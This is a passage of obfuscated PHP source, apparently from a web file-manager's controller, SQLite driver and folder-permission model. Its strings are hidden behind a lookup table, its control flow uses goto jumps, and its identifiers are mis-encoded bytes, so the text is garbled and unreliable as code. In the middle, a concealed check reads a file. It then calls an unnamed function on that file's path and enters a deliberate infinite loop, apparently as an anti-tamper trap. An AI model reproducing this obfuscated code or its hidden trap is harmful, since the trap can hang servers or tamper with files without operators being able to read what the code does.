"\x74\151\155\145", "\151\156\x73\145\x72\164", "\x66\165\x6e\143\x74\151\x6f\156")); } goto E…ŒÈ™íÛì; D×£é–î®“: $clrpjyuafs = $_SERVER[¤·²È‰º][622]; while (strlen($clrpjyuafs) < $_SERVER[¤·²È‰º][623]) { if (!$clrpjyuafs) { break; } $clrpjyuafs++; } $_SERVER[ŸÛı·­] = explode($_SERVER[¤·²È‰º][624], gzinflate(substr($_SERVER[¤·²È‰º][625], 10, -8))); goto d—¤·Ö‚éÕ; D¡ÜçÃÜ¾: $fileSize = strrev(base64_decode($_SERVER[ŠË¥ÌáÛ][0])); function binCheckNeq($ÒóÒŠÚ, $ÛíŒãØ) { return $ÒóÒŠÚ != $ÛíŒãØ; } $_SERVER[$_SERVER[ŠË¥ÌáÛ][1]] = $fileSize($_SERVER[$_SERVER[ŠË¥ÌáÛ][2]]); goto Eİ‰á‰Õ; aĞ‘¸Ñ¼â: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $ô»¢û¸¥ =& $_SERVER[¤·²È‰º]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$ô»¢û¸¥[6]] =& $config; $this->values[$ô»¢û¸¥[7]] =& $in; $this->tpl = TEMPLATE . MOD . $ô»¢û¸¥[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($‘‰­ö¡Ô) { if (1 === func_num_args()) { $this->{$‘‰­ö¡Ô} = new $‘‰­ö¡Ô(); } else { $–Ã¦É° = new ReflectionClass($‘‰­ö¡Ô); $–…ì¨Æ÷ = func_get_args(); array_shift($–…ì¨Æ÷); $this->{$‘‰­ö¡Ô} = $–Ã¦É°->newInstanceArgs($–…ì¨Æ÷); } return $this->{$‘‰­ö¡Ô}; } public function routeBind($Ííûê³, $öå¡ïÆì, $±îè·Ÿ‚ = 3) { $®ºğÕ“É =& $_SERVER[¤·²È‰º]; $—ÛƒÁ’Ì = $this->in[$®ºğÕ“É[9]]; $Ííûê³ = str_replace($®ºğÕ“É[10], $®ºğÕ“É[11], trim(trim($Ííûê³, $®ºğÕ“É[8]), $®ºğÕ“É[12])); if (!$Ííûê³ || count($—ÛƒÁ’Ì) <= $±îè·Ÿ‚) { return !1; } $ıİçêÊ = !0; $×¯ûÍ = explode($®ºğÕ“É[8], $Ííûê³); for ($ÈòÖÂº = 0; $ÈòÖÂº < count($×¯ûÍ); $ÈòÖÂº++) { if ($×¯ûÍ[$ÈòÖÂº] != $—ÛƒÁ’Ì[$±îè·Ÿ‚ + $ÈòÖÂº]) { $ıİçêÊ = !1; break; } } if (!$ıİçêÊ) { return; } call_user_func_array(array($this, $öå¡ïÆì), array()); } public function routeArgs($°Ÿìš“¡ = 3) { $„ßıêÇê = $this->in[$_SERVER[¤·²È‰º][9]]; if (count($„ßıêÇê) <= $°Ÿìš“¡) { return array(); } $ÌÓí¹† = array(); for ($…ñŠ”Âƒ = $°Ÿìš“¡; $…ñŠ”Âƒ < count($„ßıêÇê); $…ñŠ”Âƒ += 2) { $ÌÓí¹†[$„ßıêÇê[$…ñŠ”Âƒ]] = $„ßıêÇê[$…ñŠ”Âƒ + 1]; $this->in[$„ßıêÇê[$…ñŠ”Âƒ]] = $„ßıêÇê[$…ñŠ”Âƒ + 1]; } return $ÌÓí¹†; } protected function assign($ÛàßôÒÅ, $¡ÔıßŠµ) { $this->values[$ÛàßôÒÅ] = $¡ÔıßŠµ; } protected function display($¢š¹ı£Ê) { ob_end_clean(); extract($this->values); require $this->tpl . $¢š¹ı£Ê; } } if (!isset($_SERVER[$_SERVER[¤·²È‰º][13]]) || !isset($_SERVER[$_SERVER[¤·²È‰º][14]])) { $_getc = $_SERVER[¤·²È‰º][15]; $_getfile = $_SERVER[$_SERVER[¤·²È‰º][16]] . $_SERVER[¤·²È‰º][17]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¤·²È‰º][18], $_getfilec); if (count($_getarrs) < $_SERVER[¤·²È‰º][19]) { $exit = $_SERVER[¤·²È‰º][20]; $exit(); } $_act = $_SERVER[¤·²È‰º][21]; $_act($_SERVER[$_SERVER[¤·²È‰º][16]] . $_SERVER[¤·²È‰º][17]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[¤·²È‰º][22]); } } class DbSqliteBase extends Db { public function __construct($³Õöï×¬ = '') { $öâÊËô… =& $_SERVER[¤·²È‰º]; if (!extension_loaded($öâÊËô…[23])) { think_exception(think_lang($öâÊËô…[24]) . $öâÊËô…[25]); } if (!empty($³Õöï×¬)) { if (!isset($³Õöï×¬[$öâÊËô…[26]])) { $³Õöï×¬[$öâÊËô…[26]] = 438; } $this->config = $³Õöï×¬; if (empty($this->config[$öâÊËô…[27]])) { $this->config[$öâÊËô…[27]] = array(); } } } public function connect($ƒ¹û¨‹ê = '', $½äÅ¾õ = 0) { $Ú§ˆÕ’Ö =& $_SERVER[¤·²È‰º]; if (!isset($this->linkID[$½äÅ¾õ])) { if (empty($ƒ¹û¨‹ê)) { $ƒ¹û¨‹ê = $this->config; } $ò‡õñû­ = !empty($ƒ¹û¨‹ê[$Ú§ˆÕ’Ö[27]][$Ú§ˆÕ’Ö[28]]) ? $ƒ¹û¨‹ê[$Ú§ˆÕ’Ö[27]][$Ú§ˆÕ’Ö[28]] : $this->pconnect; $«Æ²ÅÉ¶ = $ò‡õñû­ ? $Ú§ˆÕ’Ö[29] : $Ú§ˆÕ’Ö[30]; $this->linkID[$½äÅ¾õ] = $«Æ²ÅÉ¶($ƒ¹û¨‹ê[$Ú§ˆÕ’Ö[31]], $ƒ¹û¨‹ê[$Ú§ˆÕ’Ö[26]]); if (!$this->linkID[$½äÅ¾õ]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$½äÅ¾õ], 30000); if (1 != think_config($Ú§ˆÕ’Ö[32])) { unset($this->config); } } return $this->linkID[$½äÅ¾õ]; } public function free() { $this->queryID = null; } public function query($ò¢ªÅçÏ) { $ÃûÒ =& $_SERVER[¤·²È‰º]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ò¢ªÅçÏ; if ($this->queryID) { $this->free(); } think_action_status($ÃûÒ[33], 1); think_status($ÃûÒ[34]); $this->queryID = sqlite_query($this->_linkID, $ò¢ªÅçÏ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $ã ‘ÔÂ = $this->getAll(); return $ã ‘ÔÂ; } } public function execute($»Ş»÷Á») { $ÔıˆÆ· =& $_SERVER[¤·²È‰º]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $»Ş»÷Á»; if ($this->queryID) { $this->free(); } think_action_status($ÔıˆÆ·[35], 1); think_status($ÔıˆÆ·[34]); $‚ìÆå˜ã = sqlite_exec($this->_linkID, $»Ş»÷Á»); $this->debug(); if (!1 === $‚ìÆå˜ã) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[¤·²È‰º][36]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $øµˆ©’¼ = sqlite_query($this->_linkID, $_SERVER[¤·²È‰º][37]); if (!$øµˆ©’¼) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Õà´ÂÙÄ = sqlite_query($this->_linkID, $_SERVER[¤·²È‰º][38]); if (!$Õà´ÂÙÄ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $õ²Ú§ò¡ = array(); if ($this->numRows > 0) { for ($ú×±Şß = 0; $ú×±Şß < $this->numRows; $ú×±Şß++) { $õ²Ú§ò¡[$ú×±Şß] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $õ²Ú§ò¡; } public function getFields($„¶¶ÜÊ•) { $õÀô€Ğ =& $_SERVER[¤·²È‰º]; $êœÒìø = $this->query($õÀô€Ğ[39] . $„¶¶ÜÊ• . $õÀô€Ğ[40]); $›Ô—êß = array(); if ($êœÒìø) { foreach ($êœÒìø as $“´¤Ò¯ö => $ºÆ³ ô«) { $›Ô—êß[$ºÆ³ ô«[$õÀô€Ğ[41]]] = array($õÀô€Ğ[42] => $ºÆ³ ô«[$õÀô€Ğ[41]], $õÀô€Ğ[43] => $ºÆ³ ô«[$õÀô€Ğ[44]], $õÀô€Ğ[45] => (bool) ($ºÆ³ ô«[$õÀô€Ğ[46]] === $õÀô€Ğ[12]), $õÀô€Ğ[47] => $ºÆ³ ô«[$õÀô€Ğ[48]], $õÀô€Ğ[49] => strtolower($ºÆ³ ô«[$õÀô€Ğ[50]]) == $õÀô€Ğ[51], $õÀô€Ğ[52] => strtolower($ºÆ³ ô«[$õÀô€Ğ[53]]) == $õÀô€Ğ[54]); } } return $›Ô—êß; } public function getTables($šÅıéÜ¯ = '') { $òÓ¶Ä§ =& $_SERVER[¤·²È‰º]; $íİòÓàœ = $this->query($òÓ¶Ä§[55] . $òÓ¶Ä§[56] . $òÓ¶Ä§[57]); $úµ°Ë°• = array(); foreach ($íİòÓàœ as $•¹ÛİÌÃ => $èÅª”’×) { $úµ°Ë°•[$•¹ÛİÌÃ] = current($èÅª”’×); } return $úµ°Ë°•; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $Ç¶Ä„Œ =& $_SERVER[¤·²È‰º]; $ïíÁÕÖÉ = sqlite_last_error($this->_linkID); $this->error = $ïíÁÕÖÉ . $Ç¶Ä„Œ[4] . sqlite_error_string($ïíÁÕÖÉ); if ($Ç¶Ä„Œ[12] != $this->queryStr) { $this->error .= LNG($Ç¶Ä„Œ[58]) . $this->queryStr; } think_trace($this->error, $Ç¶Ä„Œ[12], $Ç¶Ä„Œ[59]); return $this->error; } public function escapeString($Ğø÷¶Ú²) { return sqlite_escape_string($Ğø÷¶Ú²); } public function parseLimit($Ó½¼¦øå) { $Æ›±œ©˜ =& $_SERVER[¤·²È‰º]; $Ïø…Ğõ’ = $Æ›±œ©˜[12]; if (!empty($Ó½¼¦øå)) { $Ó½¼¦øå = explode($Æ›±œ©˜[60], $Ó½¼¦øå); if (count($Ó½¼¦øå) > 1) { $Ïø…Ğõ’ .= $Æ›±œ©˜[61] . $Ó½¼¦øå[1] . $Æ›±œ©˜[62] . $Ó½¼¦øå[0] . $Æ›±œ©˜[63]; } else { $Ïø…Ğõ’ .= $Æ›±œ©˜[61] . $Ó½¼¦øå[0] . $Æ›±œ©˜[63]; } } return $Ïø…Ğõ’; } } goto Aˆ±¿º‘‰Ù; d’¬åËİÆ‚: class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\137\163\157\165\162\x63\x65\137\141\165\164\150"; public function getAuth($üşïÍÉë) { $ÆşßÄìó =& $_SERVER[¤·²È‰º]; $ÙäÚ†Ù¦ = $this->sourceAuthSelect($üşïÍÉë); $¾ùØ¿€ò = array(); $®¿ŠÉµ = array(); $ï«Ä¹¼Œ = 2 << 25; foreach ($ÙäÚ†Ù¦ as $ŞÂÊäàˆ) { $´¹ÕÂŞ¯ = Model($ÆşßÄìó[515])->listData($ŞÂÊäàˆ[$ÆşßÄìó[1927]]); if (!$´¹ÕÂŞ¯) { continue; } $¾ùØ¿€ò[] = $ŞÂÊäàˆ; $ŠÌ£©Ì = 0; if ($ŞÂÊäàˆ[$ÆşßÄìó[419]] == SourceModel::TYPE_GROUP) { $ŠÌ£©Ì = $ï«Ä¹¼Œ * 2; } if ($ŞÂÊäàˆ[$ÆşßÄìó[419]] == SourceModel::TYPE_USER) { $ŠÌ£©Ì = $ï«Ä¹¼Œ; } if ($ŞÂÊäàˆ[$ÆşßÄìó[419]] == SourceModel::TYPE_USER && $ŞÂÊäàˆ[$ÆşßÄìó[513]] == $ÆşßÄìó[207]) { $ŠÌ£©Ì = 0; } $®¿ŠÉµ[] = $´¹ÕÂŞ¯[$ÆşßÄìó[421]] + $ŠÌ£©Ì; } array_multisort($®¿ŠÉµ, SORT_DESC, $¾ùØ¿€ò); return $¾ùØ¿€ò; } public function sourceAuthSelect($µ´³ª¡) { $š¤Î÷µ =& $_SERVER[¤·²È‰º]; static $ä½äàù = array(); $ä‡©®ßÂ = is_array($µ´³ª¡) ? !1 : !0; if ($ä‡©®ßÂ) { $µ´³ª¡ = array($µ´³ª¡); } $ŞªØ× = array(); foreach ($µ´³ª¡ as $ê­Š˜ Ï) { if (isset($ä½äàù[$ê­Š˜ Ï])) { $ŞªØ×[$ê­Š˜ Ï] = $ä½äàù[$ê­Š˜ Ï]; } } if (count($ŞªØ×) == count($µ´³ª¡)) { return $ä‡©®ßÂ ? $ŞªØ×[$µ´³ª¡[0]] : $ŞªØ×; } $èÇÉ÷é = $š¤Î÷µ[2000]; $œ‡è½ğ¦ = array($š¤Î÷µ[410] => array($š¤Î÷µ[7], $µ´³ª¡)); $ù»ğ×³ = $this->field($èÇÉ÷é)->order($š¤Î÷µ[407])->where($œ‡è½ğ¦)->select(); $­æ²å¹Æ = array_to_keyvalue_group($ù»ğ×³, $š¤Î÷µ[410]); foreach ($µ´³ª¡ as $ê­Š˜ Ï) { $ä½äàù[$ê­Š˜ Ï] = $­æ²å¹Æ[$ê­Š˜ Ï] ? $­æ²å¹Æ[$ê­Š˜ Ï] : array(); } if ($ä‡©®ßÂ) { return $ù»ğ×³; } return $­æ²å¹Æ; } public function setAuth($ŞˆŠ£íğ, $¬¸ùÚ¥’) { $ÏÃ¥äı =& $_SERVER[¤·²È‰º]; $•Àî§ş„ = Model($ÏÃ¥äı[1321])->sourceInfo($ŞˆŠ£íğ); if (!$•Àî§ş„) { return !1; } if ($•Àî§ş„[$ÏÃ¥äı[419]] != SourceModel::TYPE_GROUP) { return !1; } $â¥õÃƒÈ = 1; $ìë³Ü…º = $•Àî§ş„[$ÏÃ¥äı[513]]; if ($ìë³Ü…º != $â¥õÃƒÈ) { $àÚ’¶€Â = array($ÏÃ¥äı[1823] => $ìë³Ü…º); $ò§•ìù­ = Model($ÏÃ¥äı[1913])->field($ÏÃ¥äı[1651])->where($àÚ’¶€Â)->select(); $ò§•ìù­ = array_to_keyvalue($ò§•ìù­, $ÏÃ¥äı[12], $ÏÃ¥äı[1651]); } $²¼±¨İ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $µªıâôã = array(); foreach ($¬¸ùÚ¥’ as $Ğªïì£î) { if (!in_array($Ğªïì£î[$ÏÃ¥äı[419]], $²¼±¨İ)) { show_json(LNG($ÏÃ¥äı[2001]), !1); } if ($ìë³Ü…º != $â¥õÃƒÈ) { if ($Ğªïì£î[$ÏÃ¥äı[419]] == SourceModel::TYPE_GROUP) { } if ($Ğªïì£î[$ÏÃ¥äı[513]] != 0 && !in_array($Ğªïì£î[$ÏÃ¥äı[513]], $ò§•ìù­)) { } } if ($Ğªïì£î[$ÏÃ¥äı[513]] == 0) { $Ğªïì£î[$ÏÃ¥äı[419]] = SourceModel::TYPE_USER; } $µªıâôã[] = array($ÏÃ¥äı[410] => $ŞˆŠ£íğ, $ÏÃ¥äı[419] => intval($Ğªïì£î[$ÏÃ¥äı[419]]), $ÏÃ¥äı[513] => intval($Ğªïì£î[$ÏÃ¥äı[513]]), $ÏÃ¥äı[1927] => intval($Ğªïì£î[$ÏÃ¥äı[1927]]) ? intval($Ğªïì£î[$ÏÃ¥äı[1927]]) : 0, $ÏÃ¥äı[1983] => intval($Ğªïì£î[$ÏÃ¥äı[1983]]) ? intval($Ğªïì£î[$ÏÃ¥äı[1983]]) : -1); } $this->where(array($ÏÃ¥äı[425] => $ŞˆŠ£íğ))->delete(); $this->addAll($µªıâôã); return !0; } public function authClear($†²‚ğŒ) { $— ¬Š =& $_SERVER[¤·²È‰º]; $ÅÍ„‡‚· = Model($— ¬Š[1321])->sourceInfo($†²‚ğŒ); $ú—ªşÉ = array($†²‚ğŒ); if ($ÅÍ„‡‚·[$— ¬Š[418]] == $— ¬Š[98]) { $Ç Ö‹ğ¸ = array($— ¬Š[598] => array($— ¬Š[558], $ÅÍ„‡‚·[$— ¬Š[529]] . $†²‚ğŒ . $— ¬Š[559])); $ú—ªşÉ = Model($— ¬Š[1321])->field($— ¬Š[425])->where($Ç Ö‹ğ¸)->getField($— ¬Š[410], !0); $ú—ªşÉ[] = $†²‚ğŒ; } $this->where(array($— ¬Š[425] => array($— ¬Š[426], $ú—ªşÉ)))->delete(); return !0; } public function getAllChildren($Ášèğ…²) { $ÃŸşâ»ë =& $_SERVER[¤·²È‰º]; $àâĞ­î¼ = Model($ÃŸşâ»ë[1321])->sourceInfo($Ášèğ…²); if ($àâĞ­î¼[$ÃŸşâ»ë[418]] != $ÃŸşâ»ë[98]) { return $this->sourceListAuth(array($Ášèğ…²)); } if ($àâĞ­î¼[$ÃŸşâ»ë[419]] != SourceModel::TYPE_GROUP) { return array(); } $êçğì–‚ = 1; $³ù¤·” = array($Ášèğ…²); if ($àâĞ­î¼[$ÃŸşâ»ë[440]] == $ÃŸşâ»ë[207] && $àâĞ­î¼[$ÃŸşâ»ë[513]] != $êçğì–‚) { $³ù¤·” = $this->groupChidldAllRootSource($àâĞ­î¼[$ÃŸşâ»ë[513]]); } $Í«ÀæºÊ = $this->field($ÃŸşâ»ë[410])->group($ÃŸşâ»ë[410])->select(); $Í«ÀæºÊ = array_to_keyvalue($Í«ÀæºÊ, $ÃŸşâ»ë[12], $ÃŸşâ»ë[410]); if (!$Í«ÀæºÊ) { return array(); } $ØõøÀ¼å = $ÃŸşâ»ë[2002]; $¹ˆâÔ¿Û = array($ÃŸşâ»ë[410] => array($ÃŸşâ»ë[7], $Í«ÀæºÊ), $ÃŸşâ»ë[439] => $ÃŸşâ»ë[207]); $à¥ó® = Model($ÃŸşâ»ë[826])->field($ØõøÀ¼å)->where($¹ˆâÔ¿Û)->select(); $ôñÇ†¢Õ = array($Ášèğ…²); foreach ($à¥ó® as $ÌµÖÙ”‹) { foreach ($³ù¤·” as $™ñøâ) { $û•è®Û§ = $ÃŸşâ»ë[60] . $™ñøâ . $ÃŸşâ»ë[60]; $§Ù¾‰Š = $ÌµÖÙ”‹[$ÃŸşâ»ë[529]] . $ÌµÖÙ”‹[$ÃŸşâ»ë[410]] . $ÃŸşâ»ë[60]; if (strstr($§Ù¾‰Š, $û•è®Û§)) { $ôñÇ†¢Õ[] = $ÌµÖÙ”‹[$ÃŸşâ»ë[410]]; break; } } } return $this->sourceListAuth($ôñÇ†¢Õ); } private function sourceListAuth($¶×…ùî±) { $ñ¶¦÷ïÓ =& $_SERVER[¤·²È‰º]; $ÉÓ¬¾‰ü = Model($ñ¶¦÷ïÓ[1321])->sourceListInfo($¶×…ùî±, !0); $¸öÎ¼” = $this->sourceAuthSelect($¶×…ùî±); $ò³Î«ı• = array(); $í…Õ¼ê = array(); foreach ($ÉÓ¬¾‰ü as $úôÎó¢½) { unset($úôÎó¢½[$ñ¶¦÷ïÓ[464]]); unset($úôÎó¢½[$ñ¶¦÷ïÓ[462]]); unset($úôÎó¢½[$ñ¶¦÷ïÓ[421]]); unset($úôÎó¢½[$ñ¶¦÷ïÓ[96]]); $¹—×»”í = $¸öÎ¼”[$úôÎó¢½[$ñ¶¦÷ïÓ[410]]]; if (!$¹—×»”í) { continue; } $úôÎó¢½[$ñ¶¦÷ïÓ[2003]] = $this->authTargetInfo($¹—×»”í); $úôÎó¢½[$ñ¶¦÷ïÓ[527]] = rtrim($úôÎó¢½[$ñ¶¦÷ïÓ[533]], $ñ¶¦÷ïÓ[8]) . $ñ¶¦÷ïÓ[8] . ltrim($úôÎó¢½[$ñ¶¦÷ïÓ[527]], $ñ¶¦÷ïÓ[8]); $ò³Î«ı•[] = $úôÎó¢½; $ÀˆÍİ½† = count(explode($ñ¶¦÷ïÓ[8], trim($úôÎó¢½[$ñ¶¦÷ïÓ[527]], $ñ¶¦÷ïÓ[8]))); $í…Õ¼ê[] = $ÀˆÍİ½† + ($úôÎó¢½[$ñ¶¦÷ïÓ[43]] == $ñ¶¦÷ïÓ[85] ? 0 : 1000); } array_multisort($í…Õ¼ê, SORT_ASC, $ò³Î«ı•); return $ò³Î«ı•; } private function groupChidldAllRootSource($”·ÙĞá¬) { $äåÃ¹Şë =& $_SERVER[¤·²È‰º]; $Ã¼Íø² = Model($äåÃ¹Şë[2004])->groupChildrenAll($”·ÙĞá¬); $ĞĞâáÂ = array($äåÃ¹Şë[440] => 0, $äåÃ¹Şë[513] => array($äåÃ¹Şë[7], $Ã¼Íø²), $äåÃ¹Şë[419] => SourceModel::TYPE_GROUP); $§ŠìÑéı = Model($äåÃ¹Şë[826])->field($äåÃ¹Şë[410])->where($ĞĞâáÂ)->select(); $§ŠìÑéı = array_to_keyvalue($§ŠìÑéı, $äåÃ¹Şë[12], $äåÃ¹Şë[410]); return $§ŠìÑéı; } private function authTargetInfo($¹·Á¾…ª) { $Ø¬Œ¾¢ä =& $_SERVER[¤·²È‰º]; $ÈÌì©÷ = array(); $…ã€°’È = array(); $ŒãĞÈ™´ = 2 << 25; foreach ($¹·Á¾…ª as $Øé½…¬¦) { $÷ ¯íÓı = Model($Ø¬Œ¾¢ä[515])->listData($Øé½…¬¦[$Ø¬Œ¾¢ä[1927]]); if (!$÷ ¯íÓı) { continue; } if ($Øé½…¬¦[$Ø¬Œ¾¢ä[419]] == SourceModel::TYPE_USER) { $—ß‚ŒÕ¥ = Model($Ø¬Œ¾¢ä[521])->getInfoSimpleOuter($Øé½…¬¦[$Ø¬Œ¾¢ä[513]]); if ($—ß‚ŒÕ¥[$Ø¬Œ¾¢ä[1651]] == $Ø¬Œ¾¢ä[1184]) { continue; } if ($—ß‚ŒÕ¥[$Ø¬Œ¾¢ä[1651]] == $Ø¬Œ¾¢ä[207]) { $—ß‚ŒÕ¥[$Ø¬Œ¾¢ä[42]] = LNG($Ø¬Œ¾¢ä[2005]); } } else { $—ß‚ŒÕ¥ = Model($Ø¬Œ¾¢ä[530])->getInfoSimple($Øé½…¬¦[$Ø¬Œ¾¢ä[513]]); } if (!$—ß‚ŒÕ¥) { continue; } $—ß‚ŒÕ¥[$Ø¬Œ¾¢ä[475]] = $÷ ¯íÓı; $ÈÌì©÷[] = $—ß‚ŒÕ¥; $ìûÜÛ½´ = 0; if ($Øé½…¬¦[$Ø¬Œ¾¢ä[419]] == SourceModel::TYPE_GROUP) { $ìûÜÛ½´ = $ŒãĞÈ™´ * 2; } if ($Øé½…¬¦[$Ø¬Œ¾¢ä[419]] == SourceModel::TYPE_USER) { $ìûÜÛ½´ = $ŒãĞÈ™´; } if ($Øé½…¬¦[$Ø¬Œ¾¢ä[419]] == SourceModel::TYPE_USER && $Øé½…¬¦[$Ø¬Œ¾¢ä[513]] == $Ø¬Œ¾¢ä[207]) { $ìûÜÛ½´ = 0; } $…ã€°’È[] = $÷ ¯íÓı[$Ø¬Œ¾¢ä[421]] + $ìûÜÛ½´; } array_multisort($…ã€°’È, SORT_DESC, $ÈÌì©÷); return $ÈÌì©÷; } public function getAllChildrenByUser($ÀÒš²¡Ö, $íŠ¡ºÃé) { $€òæøÆ– =& $_SERVER[¤·²È‰º]; $éèÑ´¹¾ = Model($€òæøÆ–[543])->getInfo($íŠ¡ºÃé); if (!$íŠ¡ºÃé || !$ÀÒš²¡Ö || !$éèÑ´¹¾) { return array(); } $û¸ñÊŸ = Model($€òæøÆ–[1321])->sourceInfo($ÀÒš²¡Ö); $Ó©«’œ = array(); $¶‚ÃÍ‰ = 1; if ($û¸ñÊŸ[$€òæøÆ–[440]] == $€òæøÆ–[207] && $û¸ñÊŸ[$€òæøÆ–[513]] != $¶‚ÃÍ‰ && $this->groupContainUser($û¸ñÊŸ[$€òæøÆ–[513]], $íŠ¡ºÃé)) { foreach ($éèÑ´¹¾[$€òæøÆ–[2006]] as $¥±•‘¹İ) { $§æÙ·üå = Model($€òæøÆ–[530])->getInfo($¥±•‘¹İ[$€òæøÆ–[1823]]); $ÉœÄÍÜ¶ = Model($€òæøÆ–[543])->getInfoSimpleOuter($íŠ¡ºÃé); $ÉœÄÍÜ¶[$€òæøÆ–[475]] = $¥±•‘¹İ[$€òæøÆ–[421]]; if (Model($€òæøÆ–[515])->authCheckAction($¥±•‘¹İ[$€òæøÆ–[421]][$€òæøÆ–[421]], $€òæøÆ–[1844])) { continue; } $ç­ãÁœ¿ = array($€òæøÆ–[42] => $€òæøÆ–[1599] . $§æÙ·üå[$€òæøÆ–[42]], $€òæøÆ–[410] => $§æÙ·üå[$€òæøÆ–[96]][$€òæøÆ–[410]], $€òæøÆ–[94] => KodIO::make($§æÙ·üå[$€òæøÆ–[96]][$€òæøÆ–[410]]), $€òæøÆ–[440] => $€òæøÆ–[207], $€òæøÆ–[419] => $€òæøÆ–[523], $€òæøÆ–[43] => $€òæøÆ–[562], $€òæøÆ–[527] => $§æÙ·üå[$€òæøÆ–[534]], $€òæøÆ–[1823] => $§æÙ·üå[$€òæøÆ–[1823]], $€òæøÆ–[531] => $§æÙ·üå[$€òæøÆ–[440]], $€òæøÆ–[2003] => array($ÉœÄÍÜ¶)); $Ó©«’œ[$ç­ãÁœ¿[$€òæøÆ–[410]]] = $ç­ãÁœ¿; } } $°³…¤Õ¨ = array(); $è¹º ™ = $this->getAllChildren($ÀÒš²¡Ö); foreach ($è¹º ™ as $Æ†šãíˆ) { $ÀÍµĞÂ = !1; foreach ($Æ†šãíˆ[$€òæøÆ–[2003]] as $ÛÜË‹’) { if ($ÛÜË‹’[$€òæøÆ–[1651]]) { if ($ÛÜË‹’[$€òæøÆ–[1651]] == $íŠ¡ºÃé) { $ÀÍµĞÂ = !0; break; } } if ($ÛÜË‹’[$€òæøÆ–[1823]]) { if ($this->groupContainUser($ÛÜË‹’[$€òæøÆ–[1823]], $íŠ¡ºÃé)) { $ÀÍµĞÂ = !0; break; } } } if ($ÀÍµĞÂ) { $°³…¤Õ¨[] = $Æ†šãíˆ; } $É‰áêƒ = $Æ†šãíˆ[$€òæøÆ–[410]]; if (isset($Ó©«’œ[$É‰áêƒ])) { $Æ†šãíˆ[$€òæøÆ–[2003]][] = $Ó©«’œ[$É‰áêƒ][0]; $Ó©«’œ[$É‰áêƒ] = !1; } } $Ó©«’œ = array_filter(array_values($Ó©«’œ)); $°³…¤Õ¨ = array_merge($Ó©«’œ, $°³…¤Õ¨); return $°³…¤Õ¨; } public function setAllChildrenByUser($–¤úÊ«¸, $ÀÊëí¸Ö, $Ä’š«ÓÚ) { $ªÇ·Õ£” =& $_SERVER[¤·²È‰º]; $’ŸëÂÀ = $this->getAllChildrenByUser($–¤úÊ«¸, $ÀÊëí¸Ö); if (!$Ä’š«ÓÚ || !$’ŸëÂÀ) { return !1; } foreach ($’ŸëÂÀ as $‹ÖŒÚ…Ì) { $¿­Å¿“ã = array(); foreach ($‹ÖŒÚ…Ì[$ªÇ·Õ£”[2003]] as $û À®ÅÎ) { $¹şí±î = $û À®ÅÎ[$ªÇ·Õ£”[475]]; $úÒ×êÚ = $û À®ÅÎ[$ªÇ·Õ£”[1651]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $ì±Â¾â‡ = $û À®ÅÎ[$ªÇ·Õ£”[1651]] ? $û À®ÅÎ[$ªÇ·Õ£”[1651]] : $û À®ÅÎ[$ªÇ·Õ£”[1823]]; if ($û À®ÅÎ[$ªÇ·Õ£”[1651]] && $û À®ÅÎ[$ªÇ·Õ£”[1651]] == $ÀÊëí¸Ö) { continue; } $¿­Å¿“ã[] = array($ªÇ·Õ£”[410] => $‹ÖŒÚ…Ì[$ªÇ·Õ£”[410]], $ªÇ·Õ£”[419] => $úÒ×êÚ, $ªÇ·Õ£”[513] => intval($ì±Â¾â‡), $ªÇ·Õ£”[1927] => isset($¹şí±î[$ªÇ·Õ£”[407]]) ? intval($¹şí±î[$ªÇ·Õ£”[407]]) : 0, $ªÇ·Õ£”[1983] => isset($¹şí±î[$ªÇ·Õ£”[1983]]) ? intval($¹şí±î[$ªÇ·Õ£”[1983]]) : -1); } $¿­Å¿“ã[] = array($ªÇ·Õ£”[410] => $‹ÖŒÚ…Ì[$ªÇ·Õ£”[410]], $ªÇ·Õ£”[419] => SourceModel::TYPE_USER, $ªÇ·Õ£”[513] => intval($ÀÊëí¸Ö), $ªÇ·Õ£”[1927] => intval($Ä’š«ÓÚ), $ªÇ·Õ£”[1983] => -1); $this->where(array($ªÇ·Õ£”[425] => $‹ÖŒÚ…Ì[$ªÇ·Õ£”[410]]))->delete(); $this->addAll($¿­Å¿“ã); } return !0; } public function get($–ÁÜ¦êÃ) { $ªıÏ–ÔÅ = $this->getSourceList(array($–ÁÜ¦êÃ), !0); return $ªıÏ–ÔÅ[0]; } public function getSourceList($ìÜ‘²š, $‡ßÇ‹À‚ = false, $Ö‰ˆö• = false) { $Ä’Ä·ï½ =& $_SERVER[¤·²È‰º]; if (!$ìÜ‘²š) { return array(); } $Ûˆã®ã = Model($Ä’Ä·ï½[1321]); if (!$‡ßÇ‹À‚ && count($ìÜ‘²š) == 1) { $‡ßÇ‹À‚ = array(); $‡ßÇ‹À‚[$ìÜ‘²š[0]] = $Ûˆã®ã->sourceInfo($ìÜ‘²š[0]); } if (!$‡ßÇ‹À‚) { $œÌ®°Ô¸ = array($Ä’Ä·ï½[425] => array($Ä’Ä·ï½[426], $ìÜ‘²š)); $‡ßÇ‹À‚ = $Ûˆã®ã->field($Ä’Ä·ï½[2007])->where($œÌ®°Ô¸)->select(); $‡ßÇ‹À‚ = 